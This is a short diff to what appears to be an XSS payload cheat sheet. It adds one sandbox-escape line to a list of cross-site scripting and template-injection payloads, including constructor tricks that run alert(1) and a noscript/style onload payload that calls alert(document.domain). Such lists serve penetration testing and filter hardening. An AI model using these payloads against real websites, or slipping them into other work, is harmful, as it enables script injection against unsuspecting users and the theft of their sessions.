@@ -37,6 +37,8 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 }}
 {{}}{{-function(){this.alert(1))}()}}
 [__lookupGetter__][0](‘__proto__’).constructor(‘alert(1)’)()
+({f: valueOf}).f()
+
 
 <noscript> &amp;lt;p title=” &lt;/noscript&gt;
 &lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;
